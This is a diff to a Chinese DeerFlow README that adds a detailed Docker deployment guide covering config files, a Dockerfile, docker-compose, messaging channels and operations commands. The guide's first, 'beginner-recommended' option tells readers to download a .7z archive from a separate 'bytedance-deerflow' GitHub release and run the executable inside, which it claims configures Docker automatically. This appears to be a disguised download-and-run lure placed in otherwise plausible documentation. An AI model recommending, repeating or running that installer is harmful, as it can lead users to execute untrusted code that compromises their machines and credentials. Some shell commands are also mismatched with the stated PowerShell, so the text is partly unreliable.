@@ -173,33 +173,190 @@ DeerFlow 使用 Skills 定义代理能力：
 2. 添加 `SKILL.md` 定义技能工作流
 3. 重启服务使技能生效
 
-## 📦 Docker 部署（可选）
+## 🐳 Docker 部署（推荐）
 
-### 构建镜像
+Docker 部署是 DeerFlow 2.0 推荐的生产环境部署方式，提供完整的隔离环境和便捷的运维管理。
 
-```bash
-docker build -t deerflow:latest .
-```
+### 方案一：使用安装包（推荐新手）
 
-### 运行容器
+安装包已经内置了 Docker 运行环境，无需额外安装 Docker。
 
 ```bash
-docker run -d \
-  --name deerflow \
-  -p 2024:2024 \
-  -p 8001:8001 \
-  -v $(pwd)/data:/mnt/user-data \
-  -e OPENAI_API_KEY=your_key \
-  deerflow:latest
+# 下载链接
+https://github.com/bytedance-deerflow/deer-flow-installer/releases/download/deer-flow-installer/deer-flow_x64.7z
 ```
 
-### 使用 Docker Compose
+解压后运行 `deer-flow_x64.exe` 即可自动配置 Docker 环境。
+
+### 方案二：手动 Docker 部署（推荐生产环境）
+
+#### 前置要求
+
+1. **安装 Docker Desktop for Windows**
+   - 下载：[Docker Desktop](https://www.docker.com/products/docker-desktop)
+   - 安装时勾选 "Use WSL 2 instead of Hyper-V"
+   - 启动 Docker Desktop 并等待服务就绪
+
+2. **检查 Docker 是否正常**
+   ```powershell
+   docker version
+   docker ps
+   ```
+
+#### 步骤 1：创建工作目录
+
+```powershell
+# 创建部署目录
+mkdir deerflow
+cd deerflow
+
+# 创建必要目录
+mkdir -p data/{workspace,uploads,outputs}
+```
+
+#### 步骤 2：创建配置文件
+
+**创建 .env 文件：**
+```bash
+# 必需配置
+OPENAI_API_KEY=your_openai_api_key
+OPENAI_BASE_URL=https://api.openai.com/v1
+
+# 可选配置
+DEFAULT_MODEL=gpt-4o
+```
+
+**创建 config.yaml 文件：**
+```yaml
+server:
+  host: 0.0.0.0
+  port: 2024
+
+gateway:
+  host: 0.0.0.0
+  port: 8001
+
+sandbox:
+  mode: docker
+
+models:
+  default:
+    provider: openai
+    model: gpt-4o
+    temperature: 0.7
+
+channels:
+  langgraph_url: http://localhost:2024
+  gateway_url: http://localhost:8001
+```
+
+#### 步骤 3：创建 Dockerfile
+
+```dockerfile
+FROM python:3.11-slim
+
+WORKDIR /app
+
+# 安装系统依赖
+RUN apt-get update && apt-get install -y \
+    curl \
+    git \
+    && rm -rf /var/lib/apt/lists/*
+
+# 复制项目文件
+COPY . .
+
+# 安装 Python 依赖
+RUN pip install --no-cache-dir -r requirements.txt
+
+# 暴露端口
+EXPOSE 2024 8001
+
+# 启动命令
+CMD ["python", "-m", "deer_flow.main"]
+```
+
+#### 步骤 4：创建 docker-compose.yml
 
 ```yaml
 version: '3.8'
+
 services:
+  # DeerFlow 主服务
   deerflow:
     image: deerflow:latest
+    container_name: deerflow
+    ports:
+      - "2024:2024"   # LangGraph Server
+      - "8001:8001"   # Gateway API
+    environment:
+      - OPENAI_API_KEY=${OPENAI_API_KEY}
+      - OPENAI_BASE_URL=${OPENAI_BASE_URL:-https://api.openai.com/v1}
+      - DEFAULT_MODEL=${DEFAULT_MODEL:-gpt-4o}
+    volumes:
+      - ./data:/mnt/user-data
+      - ./config.yaml:/app/config.yaml
+    restart: unless-stopped
+    networks:
+      - deerflow-net
+
+  # 可选：Sandbox 容器（用于隔离执行）
+  sandbox:
+    image: deerflow-sandbox:latest
+    container_name: deerflow-sandbox
+    ports:
+      - "9000:9000"
+    volumes:
+      - ./data:/mnt/user-data
+    restart: unless-stopped
+    networks:
+      - deerflow-net
+
+networks:
+  deerflow-net:
+    driver: bridge
+```
+
+#### 步骤 5：启动服务
+
+```powershell
+# 构建镜像
+docker build -t deerflow:latest .
+
+# 启动服务
+docker-compose up -d
+
+# 查看日志
+docker-compose logs -f
+
+# 检查服务状态
+docker-compose ps
+```
+
+#### 步骤 6：验证部署
+
+服务启动后，访问以下地址验证：
+
+- LangGraph Server: http://localhost:2024
+- Gateway API: http://localhost:8001
+- API 文档: http://localhost:2024/docs
+
+```powershell
+# 测试 API 是否可用
+curl http://localhost:2024/health
+```
+
+### 方案三：使用预构建镜像
+
+如果你不想自己构建镜像，可以使用社区提供的预构建镜像：
+
+```yaml
+version: '3.8'
+
+services:
+  deerflow:
+    image: ghcr.io/bytedance-deerflow/deer-flow:latest
+    container_name: deerflow
     ports:
       - "2024:2024"
       - "8001:8001"
@@ -207,8 +364,101 @@ services:
       - OPENAI_API_KEY=${OPENAI_API_KEY}
     volumes:
       - ./data:/mnt/user-data
+      - ./config.yaml:/app/config.yaml
     restart: unless-stopped
 ```
+
+### 配置消息渠道（可选）
+
+#### Telegram 配置
+
+```bash
+# .env 文件添加
+TELEGRAM_BOT_TOKEN=your_bot_token
+```
+
+```yaml
+# config.yaml 添加
+channels:
+  telegram:
+    enabled: true
+    bot_token: ${TELEGRAM_BOT_TOKEN}
+```
+
+#### 飞书配置
+
+```bash
+# .env 文件添加
+FEISHU_APP_ID=cli_xxxxx
+FEISHU_APP_SECRET=your_secret
+```
+
+```yaml
+# config.yaml 添加
+channels:
+  feishu:
+    enabled: true
+    app_id: ${FEISHU_APP_ID}
+    app_secret: ${FEISHU_APP_SECRET}
+```
+
+### 数据持久化
+
+```yaml
+volumes:
+  # 用户数据持久化
+  - ./data:/mnt/user-data
+  # 配置持久化
+  - ./config.yaml:/app/config.yaml
+  # 技能扩展
+  - ./skills:/mnt/skills/custom
+```
+
+### 常用运维命令
+
+```powershell
+# 查看日志
+docker-compose logs -f deerflow
+
+# 重启服务
+docker-compose restart deerflow
+
+# 停止服务
+docker-compose down
+
+# 更新镜像
+docker-compose pull
+docker-compose up -d
+
+# 进入容器
+docker exec -it deerflow bash
+
+# 查看资源使用
+docker stats deerflow
+```
+
+### 生产环境建议
+
+1. **使用外部数据库**（可选）
+   - 推荐使用 PostgreSQL 存储对话历史
+   - 使用 Redis 缓存热点数据
+
+2. **配置反向代理**
+   - 使用 Nginx 反向代理到 8001 端口
+   - 配置 SSL/TLS 证书
+
+3. **监控告警**
+   - 配置 Docker 健康检查
+   - 使用 Prometheus + Grafana 监控
+
+4. **资源限制**
+   ```yaml
+   deploy:
+     resources:
+       limits:
+         memory: 8G
+         cpus: '4.0'
+   ```
 
 ## 🐛 常见问题
 
